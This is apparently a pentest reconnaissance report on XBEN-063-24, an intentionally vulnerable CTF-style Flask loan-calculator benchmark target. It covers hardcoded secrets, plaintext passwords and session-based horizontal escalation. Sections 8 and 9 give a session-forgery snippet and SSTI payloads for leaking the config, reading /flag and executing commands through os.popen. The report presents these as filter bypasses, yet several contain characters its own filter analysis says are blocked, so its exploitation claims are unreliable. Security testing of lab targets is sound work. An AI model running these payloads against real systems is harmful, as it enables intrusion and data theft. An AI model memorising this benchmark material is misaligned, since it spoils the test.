# Reconnaissance Deliverable: XBEN-063-24 Flask Loan Calculator

## 0) HOW TO READ THIS

This reconnaissance report provides a comprehensive map of the XBEN-063-24 Flask loan calculator application's attack surface, with emphasis on authorization vulnerabilities and the critical Server-Side Template Injection (SSTI) vulnerability.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Complete catalog of all 7 network-accessible routes with authorization details. Focus on "Required Role" (all are "user" with no distinction) and "Authorization Mechanism" columns to understand the flat security model.
- **Section 6.4 (Guards Directory):** Minimal authorization controls—only basic session checks exist with no role-based or object-level validation.
- **Section 7 (Role & Privilege Architecture):** **CRITICAL FINDING**: NO ROLES EXIST. This application has a flat authorization model where all authenticated users have identical privileges.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized IDOR candidates. All authenticated endpoints are vulnerable to horizontal privilege escalation via session forgery.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows a simple 2-tier architecture (Flask app + MySQL database) with no security boundaries beyond basic session authentication.

**Priority Order for Testing:** 
1. **SSTI vulnerability in `/total_loan_payments`** (Section 9) - Critical RCE path
2. Session forgery attacks (hardcoded secret key `'your_secret_key'`)
3. Horizontal privilege escalation via IDOR (Section 8)

---

## 1. Executive Summary

The XBEN-063-24 application is a **Flask 3.0.3**-based loan calculator web application deployed on **Apache 2.4** with **mod_wsgi** and backed by **MySQL 5.7.15**. The application is intentionally vulnerable (CTF-style challenge) and exhibits a **critically insecure security architecture** across authentication, authorization, and input validation layers.

**Primary Technology Stack:**
- **Frontend:** Bootstrap 5.x, jQuery, server-side Jinja2 templates
- **Backend:** Python 3, Flask 3.0.3, Flask-SQLAlchemy 3.1.1, PyMySQL 1.1.0
- **Database:** MySQL 5.7.15 (container-based, root credentials exposed)
- **Infrastructure:** Apache 2.4.65 (Debian), Docker Compose multi-container orchestration

**Core Application Functionality:**
The application provides basic loan management features for authenticated users:
- Session-based authentication with plaintext password storage
- User profile management (name, email, loan details)
- Loan calculation functionality with an interactive AJAX endpoint
- Dashboard displaying user loan information

**Critical Security Architecture Failures:**

1. **Server-Side Template Injection (SSTI):** The `/total_loan_payments` endpoint contains a critical SSTI vulnerability enabling Remote Code Execution. User input is embedded directly into a Jinja2 template via `render_template_string()`, protected only by a bypassable blacklist filter.

2. **No Role-Based Access Control:** The application implements ZERO authorization controls beyond session existence checks. All authenticated users have identical privileges with no admin/user distinction, no permissions system, and no object-level authorization.

3. **Hardcoded Secrets:** Flask secret key (`'your_secret_key'`) and MySQL root credentials (`loan_calculator`) are hardcoded in source code, enabling session forgery and database compromise.

4. **Plaintext Password Storage:** User passwords are stored in plaintext in MySQL database with no hashing, salting, or key derivation functions.

5. **Default Credentials:** Test account (`test:test`) is automatically created on application startup, providing immediate authenticated access.

**Attack Surface Summary:** 7 HTTP routes exposed on port 80 (HTTP only, no TLS), with 2 public endpoints and 5 authenticated endpoints. The `/total_loan_payments` AJAX endpoint serves as the primary exploitation target for RCE and CTF flag retrieval at `/flag`.

---

## 2. Technology & Service Map

### Frontend
- **Framework:** Server-side rendering with Jinja2 templates (Flask default)
- **CSS Framework:** Bootstrap 5.x (`/static/css/bootstrap.min.css`)
- **JavaScript:** jQuery (`/static/js/jquery.min.js`), Bootstrap Bundle (`/static/js/bootstrap.bundle.min.js`)
- **Template Engine:** Jinja2 with auto-escaping enabled (default Flask configuration)
- **Authentication UI:** Custom login form at `/login` with HTML comment exposing test credentials

### Backend
- **Language:** Python 3 (running in Debian Bullseye container)
- **Framework:** Flask 3.0.3 (stable release, current as of analysis date)
- **ORM:** Flask-SQLAlchemy 3.1.1 (SQLAlchemy integration)
- **Database Driver:** PyMySQL 1.1.0 (pure Python MySQL client)
- **Key Dependencies:** Only 3 packages in `requirements.txt` (minimal footprint)
- **WSGI Server:** Apache 2.4.65 with mod_wsgi-py3 (production deployment pattern)
- **Session Management:** Flask default client-side signed cookies (no server-side storage)

### Infrastructure
- **HTTP Server:** Apache 2.4.65 (Debian)
- **Container Orchestration:** Docker Compose (2-service architecture)
- **Database:** MySQL 5.7.15 (legacy version from 2016, multiple known CVEs)
- **Networking:** Docker internal network for app-to-database communication
- **Port Exposure:** Port 80 (HTTP only, no TLS/HTTPS configuration)
- **CDN:** None
- **Hosting:** Local/development (localhost:37149)

### Identified Subdomains
**From subfinder scan:** Multiple false-positive localhost subdomains detected:
- mail.localhost, autodiscover.regency.localhost, www.localhost, naeu2.naeuinc.localhost
- **Assessment:** These are NOT legitimate subdomains of the target application—subfinder noise from local DNS resolution
- **Target Application:** Single-domain deployment at `http://localhost:37149`

### Open Ports & Services
**From nmap scan (127.0.0.1):**
- **Port 80/tcp:** Caddy httpd (reverse proxy) forwarding to target application
- **Port 443/tcp:** SSL/HTTPS (not used by target application)
- **Port 631/tcp:** CUPS 2.3 (print service, out of scope)
- **Port 8888/tcp:** SimpleHTTPServer 0.6 (Python 3.12.10) with exposed `.git` repository (potential information disclosure)
- **Port 9999/tcp:** tcpwrapped (service unknown)
- **Port 49152/tcp:** Golang net/http (Tailscale VPN, requires auth, out of scope)

**Target Application Port:** `37149` (proxied via port 80 Caddy server)

**Security Note:** Port 8888 exposes a `.git` repository via HTTP directory listing, creating a source code disclosure vector. However, this is separate from the primary target application at port 37149.

---

## 3. Authentication & Session Management Flow

### Entry Points
- **Primary Login:** `POST /login` (accepts username/password form data)
- **Login UI:** `GET /login` (displays login form)
- **Session Termination:** `GET /logout` (clears session cookie)
- **No Additional Auth Methods:** No registration, password reset, OAuth, or SSO endpoints

### Mechanism

**Step-by-Step Authentication Flow:**

1. **Credential Submission** (`POST /login`)
   - User submits username and password via HTML form
   - Location: `routes.py:29-30`
   - Extraction: `username = request.form['username']`, `password = request.form['password']`

2. **Plaintext Password Validation** (`routes.py:31`)
   - Query: `User.query.filter_by(username=username, password=password).first()`
   - **CRITICAL FLAW:** Passwords compared in plaintext (no hashing)
   - Database schema: `password = db.Column(db.String(50), nullable=False)` (`models.py:8`)

3. **Session Creation** (`routes.py:34`)
   - On success: `session['user_id'] = user.id`
   - Flask stores `user_id` integer in client-side signed cookie
   - Session signing: Uses secret key `'your_secret_key'` via itsdangerous library

4. **Cookie Transmission**
   - Flask serializes session dict to JSON: `{"user_id": <int>}`
   - Signs with HMAC-SHA1 using hardcoded secret key
   - Encodes to Base64
   - Sets response header: `Set-Cookie: session=<base64_signed_data>; Path=/`
   - **MISSING FLAGS:** No HttpOnly, Secure, or SameSite attributes

5. **Session Validation on Protected Routes** (identical pattern across all endpoints)
   - Check: `user_id = session.get('user_id')` (lines 53, 65, 89, 102 in `routes.py`)
   - If exists: `user = User.query.get(user_id)` (fetch user from database)
   - If missing: `return redirect(url_for('login'))`
   - **NO ROLE VALIDATION:** Only checks session existence, not permissions

6. **Session Destruction** (`GET /logout`)
   - Clears session: `session.pop('user_id', None)` (`routes.py:46`)
   - Redirects to login page
   - **NO SERVER-SIDE INVALIDATION:** Client-side only (Flask sessions are stateless)

### Code Pointers

**Primary Authentication Logic:**
- **Login Handler:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-063-24/app/website/app/routes.py:26-40`
- **Session Creation:** `routes.py:34` - `session['user_id'] = user.id`
- **Secret Key Configuration:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-063-24/app/website/app/__init__.py:9` - `app.secret_key = 'your_secret_key'`
- **Password Model:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-063-24/app/website/app/models.py:8` - `password = db.Column(db.String(50), nullable=False)`

**Session Validation Pattern (used in all protected routes):**
```python
user_id = session.get('user_id')
if user_id:
    user = User.query.get(user_id)
    # Access granted
else:
    return redirect(url_for('login'))
```
- **Locations:** `routes.py:53` (/home), `routes.py:65` (/profile), `routes.py:89` (/loan_details), `routes.py:102` (/total_loan_payments)

**Logout Handler:**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-063-24/app/website/app/routes.py:43-47`
- **Session Clearing:** `routes.py:46` - `session.pop('user_id', None)`

### 3.1 Role Assignment Process

**Role Determination:** **NOT APPLICABLE - NO ROLES EXIST**

**Critical Finding:** The application implements ZERO role-based access control. The User model contains no `role`, `is_admin`, `permissions`, or `user_type` fields.

**User Model Schema** (`models.py:5-14`):
```python
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(50), nullable=False)
    name = db.Column(db.String(50), nullable=False)
    lastname = db.Column(db.String(50), nullable=False)
    email = db.Column(db.String(100), nullable=False)
    loan_amount = db.Column(db.Float, nullable=False)
    loan_term_months = db.Column(db.Integer, nullable=False)
    monthly_payment = db.Column(db.Float, nullable=False)
```

- **Default Role:** N/A (all users are equal)
- **Role Upgrade Path:** N/A (no roles to upgrade to)
- **Admin Accounts:** None (no admin distinction exists)

### 3.2 Privilege Storage & Validation

**Storage Location:** Not applicable (no privilege system)

**Validation Points:** 
- **Session Existence Only:** All protected routes check `session.get('user_id')`
- **No Role Checks:** No validation of user privileges, permissions, or roles
- **No Middleware:** No centralized authorization decorator or `@login_required` equivalent

**Code Implementation:**
- **Authorization Pattern:** Manual `if user_id:` checks in every route (routes.py:53, 65, 89, 102)
- **No Authorization Decorators:** No `@require_role()`, `@admin_only`, or similar decorators
- **No Permission Checks:** No permission validation logic anywhere in codebase

### 3.3 Role Switching & Impersonation

**Impersonation Features:** None implemented

**Role Switching:** Not applicable (no roles exist)

**Audit Trail:** No logging infrastructure (no authentication logs, no audit trail)

---

## 4. API Endpoint Inventory

**Network Surface Focus:** Only network-accessible HTTP endpoints are included below. Excluded: CLI scripts, build tools (Makefile, docker-compose), database initialization scripts, local-only utilities.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | `/` | anon | None | None | Unconditional redirect to `/login`. See `routes.py:21-23` |
| GET | `/login` | anon | None | None | Displays login form template. See `routes.py:26-40` |
| POST | `/login` | anon | None | Plaintext password validation | Authenticates user via `User.query.filter_by(username=username, password=password).first()`. Sets `session['user_id']` on success. See `routes.py:26-40` |
| GET | `/logout` | anon | None | None | Clears `session['user_id']` and redirects to login. See `routes.py:43-47` |
| GET | `/home` | user | None | Session check only: `session.get('user_id')` | Displays user dashboard with welcome message and loan summary. Fetches user via `User.query.get(user_id)`. See `routes.py:50-59` |
| GET | `/profile` | user | None | Session check only: `session.get('user_id')` | Displays user profile form pre-populated with database values. See `routes.py:62-83` |
| POST | `/profile` | user | None (implicit user_id from session) | Session check only: `session.get('user_id')` | Updates user profile fields: name, lastname, email, loan_amount, loan_term_months, monthly_payment. **NO INPUT VALIDATION** beyond type coercion. **MASS ASSIGNMENT VULNERABILITY**. See `routes.py:62-83`, update logic at lines 70-76 |
| GET | `/loan_details` | user | None | Session check only: `session.get('user_id')` | Displays loan information page with AJAX calculation button. See `routes.py:86-96` |
| GET | `/total_loan_payments` | user | None (accepts arbitrary parameters) | Session check only: `session.get('user_id')` | **CRITICAL SSTI VULNERABILITY**. AJAX endpoint for loan calculations. Accepts query parameters: `principal` (string), `payment` (float), `term` (int). Returns JSON response. User input embedded in template via `render_template_string()`. See `routes.py:99-131`, vulnerability at lines 118-122 |
| GET | `/static/<path>` | anon | path | None (Flask built-in) | Static file serving (CSS, JS). Serves from `/app/website/app/static/` directory. Bootstrap, jQuery, custom styles. |

**Critical Findings:**

1. **No Role Differentiation:** "Required Role" column shows all authenticated endpoints require only "user" role, but no role system exists—this is actually just session existence.

2. **Object ID Parameters:** NONE of the endpoints accept object ID parameters (no `user_id`, `loan_id` in URL paths), BUT this creates a vulnerability: the `user_id` from session is trusted without validation, enabling horizontal privilege escalation via session forgery.

3. **Authorization Mechanism Uniformity:** All protected endpoints use identical session check (`session.get('user_id')`). No decorator-based auth, no middleware, no centralized authorization.

4. **IDOR Vulnerability Vector:** Since `user_id` comes from the forged-able session cookie (hardcoded secret `'your_secret_key'`), attackers can access arbitrary users' data by forging sessions with different `user_id` values.

5. **Missing CSRF Protection:** All POST endpoints (`/login`, `/profile`) lack CSRF token validation, enabling cross-site request forgery attacks.

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only network-accessible input vectors are reported. Excluded: CLI tool inputs, build scripts, local utilities, environment variables not exposed via web interface.

### URL Parameters

**Endpoint:** `GET /total_loan_payments`
- **Parameter:** `principal` (string) - **CRITICAL SSTI VULNERABILITY**
  - **Location:** `routes.py:105` - `principal = request.args.get('principal', type=str).strip()`
  - **Validation:** Blacklist filter at `routes.py:114-116` (blocks `{{`, `}}`, `[`, `]`, `_`, `.`)
  - **Sink:** `routes.py:118-122` - Embedded in Jinja2 template via f-string, passed to `render_template_string()`
  - **Exploitability:** HIGH - Blacklist bypassable using `{% %}` syntax instead of `{{ }}`

- **Parameter:** `payment` (float)
  - **Location:** `routes.py:106` - `payment = request.args.get('payment', type=float)`
  - **Validation:** Type coercion only (Flask converts to float)
  - **Sink:** `routes.py:122` - Passed as template variable (safe, Jinja2 auto-escapes)

- **Parameter:** `term` (int)
  - **Location:** `routes.py:107` - `term = request.args.get('term', type=int)`
  - **Validation:** Type coercion only
  - **Sink:** `routes.py:122` - Passed as template variable (safe)

### POST Body Fields (Form Data)

**Endpoint:** `POST /login`
- **Field:** `username`
  - **Location:** `routes.py:29` - `username = request.form['username']`
  - **Validation:** NONE
  - **Sink:** `routes.py:31` - SQLAlchemy ORM query (safe from SQL injection via parameterization)
  
- **Field:** `password`
  - **Location:** `routes.py:30` - `password = request.form['password']`
  - **Validation:** NONE
  - **Sink:** `routes.py:31` - SQLAlchemy ORM query, plaintext comparison

**Endpoint:** `POST /profile`
- **Field:** `name`
  - **Location:** `routes.py:70` - `user.name = request.form['name']`
  - **Validation:** NONE (no length limit, no format validation)
  - **Sink:** `routes.py:76` - `db.session.commit()`, then rendered in templates (Jinja2 auto-escaping provides XSS protection)

- **Field:** `lastname`
  - **Location:** `routes.py:71` - `user.lastname = request.form['lastname']`
  - **Validation:** NONE
  - **Sink:** Database storage, template rendering

- **Field:** `email`
  - **Location:** `routes.py:72` - `user.email = request.form['email']`
  - **Validation:** NONE (no email format validation)
  - **Sink:** Database storage, template rendering

- **Field:** `loan_amount`
  - **Location:** `routes.py:73` - `user.loan_amount = float(request.form['loan_amount'])`
  - **Validation:** Type coercion only (no range check, no min/max validation)
  - **Sink:** Database storage, numeric rendering
  - **Error Handling:** NONE (malformed input causes 500 error)

- **Field:** `loan_term_months`
  - **Location:** `routes.py:74` - `user.loan_term_months = int(request.form['loan_term_months'])`
  - **Validation:** Type coercion only (no 1-360 month range check)
  - **Sink:** Database storage

- **Field:** `monthly_payment`
  - **Location:** `routes.py:75` - `user.monthly_payment = float(request.form['monthly_payment'])`
  - **Validation:** Type coercion only
  - **Sink:** Database storage

### HTTP Headers

**No Custom Header Processing:** The application does not read or process custom HTTP headers like `X-Forwarded-For`, `X-Real-IP`, `X-Custom-Auth`, etc.

**Session Cookie:** 
- **Header:** `Cookie: session=<base64_signed_data>`
- **Processing:** Flask framework automatically validates signature using secret key
- **Vulnerability:** Hardcoded secret key `'your_secret_key'` enables session forgery

**Standard Headers:** Flask processes standard headers (Host, User-Agent, etc.) but does not use them for business logic or security decisions.

### Cookie Values

**Session Cookie:**
- **Name:** `session`
- **Format:** Base64-encoded JSON signed with HMAC-SHA1
- **Content:** `{"user_id": <integer>}`
- **Validation:** Flask's itsdangerous library verifies signature
- **Vulnerability:** Secret key `'your_secret_key'` is hardcoded (`__init__.py:9`), enabling forgery

**No Other Application Cookies:** No preference cookies, tracking cookies, or additional authentication cookies.

---

## 6. Network & Interaction Map

**Network Surface Focus:** Only network-accessible infrastructure is mapped. Excluded: local development environments, build CI systems, local-only docker-compose networks not exposed via target application.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|---|---|---|---|---|---|
| FlaskApp | Service | App | Python 3/Flask 3.0.3 | PII, Tokens, Financial | Main application backend at localhost:37149 |
| ApacheHTTP | Service | Edge | Apache 2.4.65/mod_wsgi | None | WSGI server forwarding to Flask app |
| MySQLDatabase | DataStore | Data | MySQL 5.7.15 | PII, Tokens, Financial, Secrets | Stores user accounts (plaintext passwords), loan data |
| CaddyProxy | Service | Edge | Caddy httpd | None | Reverse proxy on port 80 forwarding to application |
| ExternalUser | ExternAsset | Internet | Browser | N/A | Unauthenticated users accessing application |
| AuthenticatedUser | Identity | Internet | Browser | Session Cookie | Users with valid session cookies |

### 6.2 Entity Metadata

| Title | Metadata |
|---|---|
| FlaskApp | Hosts: `http://localhost:37149`; Endpoints: `/`, `/login`, `/logout`, `/home`, `/profile`, `/loan_details`, `/total_loan_payments`, `/static/*`; Auth: Flask session (client-side signed cookies); Dependencies: MySQLDatabase; Secret: `'your_secret_key'`; Vulnerabilities: SSTI in `/total_loan_payments`, hardcoded secrets, plaintext passwords |
| ApacheHTTP | Server: `Apache/2.4.65 (Debian)`; Module: `mod_wsgi-py3`; Port: Internal (docker network); WSGI App: FlaskApp; Config: `/app/loan_calculator-httpd.conf`; Security: Wildcard CORS (`Access-Control-Allow-Origin: *`), directory indexing enabled |
| MySQLDatabase | Engine: `MySQL 5.7.15`; Exposure: `Internal docker network only`; Port: `3306`; Consumers: `FlaskApp`; Credentials: `root:loan_calculator` (hardcoded); Database: `database`; Vulnerable: Legacy version with known CVEs (CVE-2017-3599, CVE-2017-3600, CVE-2017-3651) |
| CaddyProxy | Server: `Caddy httpd`; Port: `80`; Forwarding: `localhost:37149`; TLS: Not configured (HTTP only) |
| ExternalUser | Access: `http://localhost:37149` via browser; Authentication: None; Entry Points: `/`, `/login` |
| AuthenticatedUser | Session: `Cookie: session=<signed_user_id>`; Access: All protected endpoints (`/home`, `/profile`, `/loan_details`, `/total_loan_payments`); Role: None (flat security model) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|---|---|---|---|---|
| ExternalUser → CaddyProxy | HTTP | `:80` | None | Public |
| CaddyProxy → ApacheHTTP | HTTP | `:80 → internal` | None | Public |
| ApacheHTTP → FlaskApp | WSGI | `mod_wsgi internal` | None | Public, PII, Tokens |
| AuthenticatedUser → FlaskApp | HTTP | `:37149 /home` | auth:session | PII, Financial |
| AuthenticatedUser → FlaskApp | HTTP | `:37149 /profile` | auth:session | PII, Financial (write) |
| AuthenticatedUser → FlaskApp | HTTP | `:37149 /loan_details` | auth:session | Financial |
| AuthenticatedUser → FlaskApp | HTTP | `:37149 /total_loan_payments` | auth:session | Financial, **SSTI sink** |
| FlaskApp → MySQLDatabase | TCP | `:3306 internal docker network` | docker-network-isolation | PII, Tokens, Secrets, Financial |
| FlaskApp → MySQLDatabase | TCP | `:3306 SELECT queries` | docker-network-isolation | PII, Financial (read) |
| FlaskApp → MySQLDatabase | TCP | `:3306 UPDATE queries` | docker-network-isolation | PII, Financial (write) |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|---|---|---|
| auth:session | Auth | Requires a valid Flask session cookie with `user_id` field. Session must be signed with secret key `'your_secret_key'`. Validates session existence only, NOT user ownership or permissions. |
| docker-network-isolation | Network | Restricts MySQL port 3306 to internal Docker network. Not accessible from host network or external sources. However, if RCE achieved via SSTI, attacker inherits FlaskApp's internal network access. |
| cors:wildcard | Protocol | **INSECURE** - Apache configuration sets `Access-Control-Allow-Origin: *`, allowing any website to make AJAX requests to the application. Enables CSRF attacks. |

**Notable Missing Guards:**
- **NO role-based authorization** (no `auth:admin`, `auth:manager`, etc.)
- **NO object ownership validation** (no `ownership:user`, `ownership:group`)
- **NO CSRF protection** (no `csrf:token` validation)
- **NO rate limiting** (no `ratelimit:login`, `ratelimit:api`)
- **NO TLS/HTTPS** (no `tls:required` for encrypted transport)
- **NO IP allowlisting** (no `ip-allowlist` restrictions)

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

**CRITICAL FINDING: ZERO ROLES EXIST**

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|---|---|---|---|
| anonymous | 0 | Global | No authentication required. Can access `/`, `/login`, `/logout`, `/static/*`. |
| authenticated | 1 | Global | Any user with valid session cookie. Can access `/home`, `/profile`, `/loan_details`, `/total_loan_payments`. **NO ROLE FIELD IN DATABASE** - all authenticated users have identical privileges. |

**Analysis:**
- User model (`models.py:5-14`) contains NO `role`, `is_admin`, `permissions`, or `user_type` fields
- No role constants, enums, or configuration anywhere in codebase
- No admin vs user distinction
- No permissions table or permission model
- All authorization decisions are binary: session exists = full access, session missing = redirect to login

### 7.2 Privilege Lattice

**Flat Authorization Model (No Hierarchy):**

```
anonymous → authenticated
   ↓            ↓
/login      /home, /profile, /loan_details, /total_loan_payments

• No role hierarchy
• No vertical privilege escalation risk (no elevated roles exist)
• All authenticated users have identical privileges
• Horizontal privilege escalation via session forgery is PRIMARY attack vector
```

**No Role Ordering:** Since roles don't exist, there is no privilege dominance relationship.

**No Parallel Isolation:** All authenticated users can access the same endpoints with identical permissions.

**Session Forgery Enables Horizontal Escalation:**
- Hardcoded secret `'your_secret_key'` allows forging sessions with arbitrary `user_id` values
- Attacker can forge session: `{'user_id': 20}` to access user 20's data
- No validation that session `user_id` belongs to the authenticated user

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|---|---|---|---|
| anonymous | `/` (redirects to `/login`) | `/`, `/login`, `/logout`, `/static/*` | None |
| authenticated | `/home` | `/home`, `/profile`, `/loan_details`, `/total_loan_payments`, `/logout`, `/static/*` | Flask session cookie (signed with `'your_secret_key'`) |

**No Role-Specific Dashboards:** All authenticated users see the same home page (`/home`) after login.

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|---|---|---|---|
| authenticated | Manual `if user_id:` checks in each route | `session.get('user_id')` - validates session existence only | Flask session cookie (client-side signed, contains `{"user_id": <int>}`) |

**Code Locations:**
- **Session Check Pattern:** `routes.py:53` (/home), `routes.py:65` (/profile), `routes.py:89` (/loan_details), `routes.py:102` (/total_loan_payments)
- **No Centralized Middleware:** No `@login_required` decorator, no `before_request` auth hook
- **No Role Validation:** Authorization checks only verify session existence, never validate roles (because they don't exist)

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**CRITICAL FINDING:** All authenticated endpoints are vulnerable to horizontal privilege escalation via session forgery due to hardcoded secret key.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|---|---|---|---|---|
| **CRITICAL** | `/profile` (POST) | `user_id` (implicit from session) | user_data + financial | **User can modify any other user's profile, loan data, PII, and financial information** via forged session with different `user_id`. Mass assignment vulnerability at `routes.py:70-76` allows updating all user fields. |
| **HIGH** | `/profile` (GET) | `user_id` (implicit from session) | user_data + financial | **User can view any other user's profile details** including name, lastname, email, loan_amount, loan_term_months, monthly_payment. PII disclosure. |
| **HIGH** | `/home` | `user_id` (implicit from session) | user_data + financial | **User can view any other user's dashboard** with welcome message showing full name and loan summary. |
| **HIGH** | `/loan_details` | `user_id` (implicit from session) | financial | **User can view any other user's loan details** including loan_amount, loan_term_months, monthly_payment. |
| **MEDIUM** | `/total_loan_payments` | None (arbitrary parameters accepted) | financial calculation | **Authenticated user can perform loan calculations for arbitrary values**. While this endpoint doesn't explicitly expose other users' data, it's accessible after session forgery and contains the SSTI vulnerability. |

**Attack Vector:**
1. **Obtain Secret Key:** `'your_secret_key'` (hardcoded at `__init__.py:9` or leaked via SSTI)
2. **Forge Session Cookie:**
   ```python
   from flask.sessions import SecureCookieSessionInterface
   app.secret_key = 'your_secret_key'
   session_data = {'user_id': 20}  # Target user ID
   forged_cookie = session_serializer.dumps(session_data)
   ```
3. **Access Target User's Data:**
   ```http
   GET /profile HTTP/1.1
   Cookie: session=<forged_cookie_with_user_id_20>
   ```
4. **Result:** Access to user 20's profile, home page, loan details, and ability to modify their data

### 8.2 Vertical Privilege Escalation Candidates

**NOT APPLICABLE:** No vertical privilege escalation opportunities exist because there are no elevated roles (admin, moderator, etc.) in the application.

**However, Alternative Escalation Path Exists:**

| Target | Endpoint Pattern | Functionality | Risk Level |
|---|---|---|---|
| Database Root Access | N/A (post-exploitation) | If RCE achieved via SSTI, attacker inherits Flask app's MySQL root credentials (`root:loan_calculator`) from `__init__.py:12` | CRITICAL |
| Flask Configuration Access | `/total_loan_payments` (SSTI) | SSTI exploitation can access `{{ config }}` object to leak secret key, database credentials, environment variables | CRITICAL |

### 8.3 Context-Based Authorization Candidates

**Finding:** The application has minimal multi-step workflows, but several context-based bypass opportunities exist:

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|---|---|---|---|
| Login → Protected Access | `/home`, `/profile`, `/loan_details`, `/total_loan_payments` | Must complete login via `/login` first | **BYPASSABLE:** Session forgery allows direct access to protected endpoints without logging in. Attacker can craft valid session cookie without presenting credentials. |
| Profile Update | `/profile` (POST) | User should only modify their own profile | **BYPASSABLE:** Session forgery allows modifying arbitrary users' profiles. No validation that session `user_id` matches authenticated user. |
| Loan Calculation | `/total_loan_payments` | Should use authenticated user's loan data | **BYPASSABLE:** Accepts arbitrary `principal`, `payment`, `term` parameters without validating ownership. Any authenticated user can calculate arbitrary loan values. |

**No Multi-Step Form Wizards:** The application has no complex workflows like onboarding, checkout, or multi-step forms that could be bypassed.

---

## 9. Injection Sources (Command Injection, SQL Injection, LFI/RFI, SSTI, Path Traversal, Deserialization)

**Network Surface Focus:** Only injection sources in network-accessible code paths are reported. Excluded: CLI scripts, build tools, database initialization scripts, local-only utilities.

### Server-Side Template Injection (SSTI) - CRITICAL

**INJECTION SOURCE DEFINITION:** User-controllable input embedded in Jinja2 template string and passed to `render_template_string()`.

**Source:** `principal` parameter from `GET /total_loan_payments`

**Complete Data Flow:**

1. **Entry Point:** `routes.py:105`
   ```python
   principal = request.args.get('principal', type=str).strip()
   ```
   - User input: Query parameter `?principal=<value>`
   - Initial processing: `.strip()` removes whitespace only

2. **Null Validation:** `routes.py:110-111`
   ```python
   if principal is None or payment is None or term is None:
       return Response('Missing principal, payment or term parameters', status=400)
   ```

3. **Blacklist Filter (INCOMPLETE):** `routes.py:114-116`
   ```python
   if "{{" in principal or "}}" in principal or "[" in principal or \
       "]" in principal or "_" in principal or "." in principal:
       return Response('GET parameter `principal` contains forbidden characters.', status=400)
   ```
   - **Blocked:** `{{`, `}}`, `[`, `]`, `_`, `.`
   - **NOT Blocked:** `{%`, `%}`, `|`, `()`, `'`, `"`, and many other Jinja2 syntax elements

4. **Template Construction (VULNERABILITY):** `routes.py:118-120`
   ```python
   json_template = f"""
   {{ "loan_principal": "{principal}" ,"monthly_payment": "{{{{ payment }}}}", "loan_term_amount": "{{{{ term }}}}", "total_loan_payments": "{{{{ payment*term }}}}" }}
   """
   ```
   - **Dangerous Pattern:** User input `principal` embedded via f-string interpolation
   - Template string contains user-controlled content BEFORE rendering

5. **Dangerous Sink:** `routes.py:122`
   ```python
   rendered = render_template_string(json_template, payment=payment, term=term, content_type='application/json')
   ```
   - **Function:** `render_template_string()` - executes Jinja2 template with user input
   - **Impact:** Remote Code Execution

6. **Post-Render Validation (TOO LATE):** `routes.py:125-126`
   ```python
   if re.match("^[0-9\.]*$", json.loads(rendered)['loan_principal']) is None:
       return Response('Computed `loan_principal` value is not a number.', status=400)
   ```
   - Validates output format, but code execution already occurred during rendering

**Exploitation Path:**

**Bypass Technique:** Use `{% %}` statement syntax instead of `{{ }}` expression syntax
```
Payload: {% for key in config %}{{ key }}: {{ config[key] }}{% endfor %}
```

**Attack Scenarios:**

1. **Configuration Disclosure:**
   ```
   GET /total_loan_payments?principal={%20for%20key%20in%20config%20%}{{%20key%20}}{% endfor %}&payment=100&term=12
   ```
   - Leaks Flask `config` object with secret key and database credentials

2. **File Read (CTF Flag):**
   ```
   GET /total_loan_payments?principal={%20with%20open('/flag')%20as%20f%20%}{{%20f.read()%20}}{% endwith %}&payment=100&term=12
   ```
   - Reads CTF flag from `/flag` file (mentioned in pre-recon as Docker build-time injection)

3. **Command Execution:**
   ```
   GET /total_loan_payments?principal={%20set%20x=cycler().__init__.__globals__.os.popen('whoami').read()%20%}{{x}}&payment=100&term=12
   ```
   - Achieves RCE via Python module introspection and `os.popen()`

**Security Impact:** **CRITICAL - Remote Code Execution**
- Full server compromise
- Database root access (inherit app's MySQL credentials)
- CTF flag retrieval
- Session secret key disclosure
- Horizontal privilege escalation enabler

### SQL Injection - NONE FOUND (PROTECTED)

**Status:** No SQL injection vulnerabilities detected.

**Reason:** Application uses SQLAlchemy ORM exclusively with parameterized queries.

**Examples:**

- **Login:** `User.query.filter_by(username=username, password=password).first()` (`routes.py:31`)
  - ORM method `filter_by()` uses parameter binding automatically

- **User Fetch:** `User.query.get(user_id)` (`routes.py:55, 67, 91`)
  - Primary key lookup via ORM `.get()` is parameterized

- **Profile Update:** ORM attribute assignment + `db.session.commit()` (`routes.py:70-76`)
  - No raw SQL, ORM generates parameterized UPDATE statements

**Conclusion:** SQLAlchemy ORM provides strong protection against SQL injection.

### Command Injection - NONE FOUND

**Status:** No command injection vulnerabilities detected in network-accessible code.

**Reason:** Application does not import or use command execution modules.

**Verified Absent:**
- No `os.system()`, `subprocess.run()`, `os.popen()`, `exec()`, `eval()` calls
- No imports: `os`, `subprocess`, `commands` modules not imported in routes or application code

**Note:** Command execution CAN be achieved indirectly via SSTI exploitation (see SSTI section above).

### File Inclusion / Path Traversal - NONE FOUND

**Status:** No file inclusion or path traversal vulnerabilities detected.

**Reason:** All template names are hardcoded strings.

**Template Usage:**
- `render_template('login.html')` - hardcoded
- `render_template('home.html', user=user)` - hardcoded
- `render_template('profile.html', user=user)` - hardcoded
- `render_template('loan_details.html', ...)` - hardcoded

